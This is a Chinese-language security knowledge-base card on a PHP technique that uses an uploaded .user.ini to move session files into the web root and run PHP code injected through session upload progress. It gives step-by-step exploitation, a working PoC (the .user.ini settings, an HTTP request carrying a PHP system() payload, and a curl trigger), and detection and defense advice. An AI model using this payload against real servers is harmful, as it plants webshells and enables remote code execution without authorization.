---
id: web-php-file-inclusion-user-ini-session-save-path-webshell
title: .user.ini 改写 session.save_path 把可控 Session 文件写入 Web 目录
type: scenario
domain: web
path: web/php/file-inclusion
technique: user-ini-session-file-webshell
tags:
- php
- session
- user-ini
- file-inclusion
- rce
- session-upload-progress
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V18
  verified_at: '2026-11-05T02:18:59+08:00'
  notes: 已对照原文核对：session.save_path 改到 Web 目录、session.upload_progress 写 sess_<id>、auto_prepend_file=sess_hacker 或已有 LFI 包含、cleanup 清理时序影响均与原文一致；卡片已按未直接验证的清理时序标 medium confidence
url: /docs/web/php/file-inclusion/web-php-file-inclusion-user-ini-session-save-path-webshell/
draft: false
kb_aliases:
- session.save_path 写马
- session.upload_progress 写 Session
- sess_ 文件包含
- PHP-FPM Session 文件
- 无需上传第二份文件写 shell
---

## 一句话结论

仅能上传 `.user.ini` 而不能上传其他文件时，把 `session.save_path` 改到 Web 可访问目录，再用 `session.upload_progress` 或登录写入 Session 数据，Session 文件会以 `sess_<id>` 落在 Web 目录；配合 `auto_prepend_file` 或已有文件包含即可执行其中代码。

## 原理

- PHP 把 Session 序列化后写入 `session.save_path` 下的 `sess_<PHPSESSID>` 文件，内容由应用写入 Session 的变量决定。`session.save_path` 属于 `PHP_INI_ALL`，因此可以被 `.user.ini` 修改。
- `session.upload_progress` 会在文件上传期间把进度信息写入 Session，其中 `PHP_SESSION_UPLOAD_PROGRESS` 字段的值会作为进度名进入 Session 数据。攻击者用固定 `PHPSESSID` 上传一个 multipart 请求，就能让 PHP 在指定目录生成内容部分可控的 `sess_<id>`。
- Session 文件默认没有 `.php` 后缀，不会被 Apache/Nginx 直接当脚本解析；因此需要把它当成“被包含文件”：在同一个 `.user.ini` 里加 `auto_prepend_file=sess_hacker`，或利用站点已有的 LFI 去包含 `sess_hacker`。
- 这也解释了为什么该手法常与 `session.upload_progress` 搭配：它不需要目标有登录功能，任意文件上传点即可触发 Session 写入。
- `session.upload_progress.cleanup` 默认会在请求结束时删除进度数据，实际利用中通常需要在 `.user.ini` 里设为 `Off`，或在校验/包含时序上抢在清理前完成；不同 PHP 版本行为有差异，因此本条置信度为 medium。

## 触发条件

- 可写入 `.user.ini`，且 `session.save_path` 未被 `php_admin_value` 锁定。
- `session.save_path` 指向的目录对 PHP-FPM 用户可写、且可被 Web 访问（或可被已有 LFI 包含）。
- 目标开启 Session 上传进度（PHP 5.4+ 默认可用），或存在会把用户输入写进 Session 的登录/表单功能。
- 同目录或上级目录有 PHP 脚本被请求，使 `auto_prepend_file` 生效；或站点存在可控文件包含点。

## 利用步骤

1. 上传 `.user.ini`，把 Session 目录改到 Web 目录，并把 `auto_prepend_file` 指向即将生成的 Session 文件名。
2. 设置 `session.upload_progress.cleanup=Off`（如可用），避免 Session 文件在请求结束时被清空。
3. 发送一个 multipart 上传请求，Cookie 固定 `PHPSESSID=hacker`，表单字段 `PHP_SESSION_UPLOAD_PROGRESS` 的值写入 PHP 代码。
4. 确认目录下出现 `sess_hacker`，其中包含 payload。
5. 请求同目录任意 PHP 页面，`auto_prepend_file=sess_hacker` 会先包含并执行 payload；若有现成 LFI，也可直接包含该文件。

## PoC

`.user.ini`：

```ini
session.save_path=/var/www/html/upload
session.upload_progress.cleanup=Off
auto_prepend_file=sess_hacker
```

写入 Session 的请求（`PHP_SESSION_UPLOAD_PROGRESS` 的值会成为 Session 数据的一部分）：

```http
POST /upload.php HTTP/1.1
Host: target
Cookie: PHPSESSID=hacker
Content-Type: multipart/form-data; boundary=X

--X
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

<?php system('id'); ?>
--X
Content-Disposition: form-data; name="file"; filename="a.txt"

x
--X--
```

随后访问：

```bash
curl -s -b 'PHPSESSID=hacker' 'http://target/upload/index.php'
```

## 变体与关联

- 不写 `auto_prepend_file`，改为利用站点已有 LFI 包含 `sess_hacker`；此时 `.user.ini` 只负责把 Session 文件搬到可包含的位置。
- 有登录功能时，可把 payload 写进用户名/个人简介等会被存入 Session 的字段，省去上传进度依赖。
- `uploadprogress.manager.filename` 可改变进度文件命名模板，但原文未给出可复现细节，本卡不作为主路径。
- 关联：[[web-php-file-inclusion-user-ini-auto-prepend-rce]]（直接上传 payload 文件）；[[web-php-file-inclusion-php-error-log-poisoning-webshell]]（另一种“只能写配置文件”时的落马方式）。
- 边界：`session.save_path` 被 `php_admin_value` 锁定、目标禁用 Session、或 Session 文件内容被序列化格式包裹导致 PHP 标签不生效时，需要调整 payload 位置或改用其他落马方式。

## 检测与防御

- 检测：`.user.ini` 中出现 `session.save_path` 指向 Web 目录；Web 目录出现 `sess_*` 文件；短时间内大量带固定 `PHPSESSID` 的上传请求；PHP 进程读取 Web 目录下的 `sess_*`。
- 防御：`php_admin_value` 锁定 `session.save_path` 到 Web 根之外；设置 `session.upload_progress.enabled=Off` 或保留默认 cleanup；关闭 `.user.ini`；上传目录禁止 PHP 执行与文件包含；定期扫描 Web 目录中的 `sess_*`。
